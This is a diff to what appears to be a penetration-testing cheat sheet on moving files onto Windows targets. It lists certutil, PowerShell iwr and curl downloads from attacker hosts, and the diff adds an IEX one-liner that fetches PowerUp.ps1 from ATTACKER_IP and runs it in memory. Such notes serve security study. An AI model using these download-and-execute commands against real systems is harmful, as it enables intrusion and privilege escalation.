@@ -15,7 +15,12 @@ certutil -urlcache http://<IP>/something.exe C:\Users\Administrator\Desktop\some
 Powershell:
 ```
 iwr -uri http://<KALI_IP>/file.exe -OutFile file.exe
+```
+```
 curl http://<IP>/somthing.exe -o something.exe
+```
+```
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
 ```
 With evil-winrm:
 ```
